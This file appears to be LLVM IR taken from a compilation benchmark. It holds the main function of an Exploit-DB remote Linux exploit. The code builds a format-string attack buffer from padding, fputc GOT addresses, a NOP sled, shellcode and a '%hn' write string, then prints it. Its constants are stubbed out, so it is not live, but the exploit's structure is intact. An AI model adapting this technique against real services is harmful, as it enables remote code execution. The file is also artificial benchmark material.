; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23740.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23740.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZ = common dso_local global i32 0, align 4
@DUMMY = common dso_local global i32 0, align 4
@PADDING = common dso_local global i32 0, align 4
@FPUTCGOT = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@NOPSPACE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"%%%dx%%%d$hn%%%dx%%%d$hn\00", align 1
@FMTNUM1 = common dso_local global i32 0, align 4
@STACKPOP = common dso_local global i32 0, align 4
@FMTNUM2 = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i64, align 8
  %3 = alloca i8*, align 8
  %4 = load i32, i32* @BUFSIZ, align 4
  %5 = zext i32 %4 to i64
  %6 = call i8* @llvm.stacksave()
  store i8* %6, i8** %1, align 8
  %7 = alloca i8, i64 %5, align 16
  store i64 %5, i64* %2, align 8
  store i8* %7, i8** %3, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = load i32, i32* @BUFSIZ, align 4
  %10 = call i32 @memset(i8* %8, i32 0, i32 %9)
  %11 = load i8*, i8** %3, align 8
  %12 = load i32, i32* @DUMMY, align 4
  %13 = load i32, i32* @PADDING, align 4
  %14 = call i32 @memset(i8* %11, i32 %12, i32 %13)
  %15 = load i32, i32* @PADDING, align 4
  %16 = load i8*, i8** %3, align 8
  %17 = sext i32 %15 to i64
  %18 = getelementptr inbounds i8, i8* %16, i64 %17
  store i8* %18, i8** %3, align 8
  %19 = load i64, i64* @FPUTCGOT, align 8
  %20 = inttoptr i64 %19 to i8*
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i8**
  store i8* %20, i8** %22, align 8
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i64, i64* @FPUTCGOT, align 8
  %26 = inttoptr i64 %25 to i8*
  %27 = getelementptr i8, i8* %26, i64 2
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i8**
  store i8* %27, i8** %29, align 8
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 4
  store i8* %31, i8** %3, align 8
  %32 = load i8*, i8** %3, align 8
  %33 = load i32, i32* @NOP, align 4
  %34 = load i32, i32* @NOPSPACE, align 4
  %35 = call i32 @memset(i8* %32, i32 %33, i32 %34)
  %36 = load i32, i32* @NOPSPACE, align 4
  %37 = load i8*, i8** %3, align 8
  %38 = sext i32 %36 to i64
  %39 = getelementptr inbounds i8, i8* %37, i64 %38
  store i8* %39, i8** %3, align 8
  %40 = load i8*, i8** %3, align 8
  %41 = load i32, i32* @shellcode, align 4
  %42 = load i32, i32* @shellcode, align 4
  %43 = call i32 @strlen(i32 %42)
  %44 = call i32 @memcpy(i8* %40, i32 %41, i32 %43)
  %45 = load i32, i32* @shellcode, align 4
  %46 = call i32 @strlen(i32 %45)
  %47 = load i8*, i8** %3, align 8
  %48 = sext i32 %46 to i64
  %49 = getelementptr inbounds i8, i8* %47, i64 %48
  store i8* %49, i8** %3, align 8
  %50 = load i8*, i8** %3, align 8
  %51 = load i32, i32* @FMTNUM1, align 4
  %52 = load i32, i32* @STACKPOP, align 4
  %53 = load i32, i32* @FMTNUM2, align 4
  %54 = load i32, i32* @STACKPOP, align 4
  %55 = add nsw i32 %54, 1
  %56 = call i32 @sprintf(i8* %50, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i32 %51, i32 %52, i32 %53, i32 %55)
  %57 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %7)
  %58 = load i8*, i8** %1, align 8
  call void @llvm.stackrestore(i8* %58)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i32, i32, i32, i32) #2

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
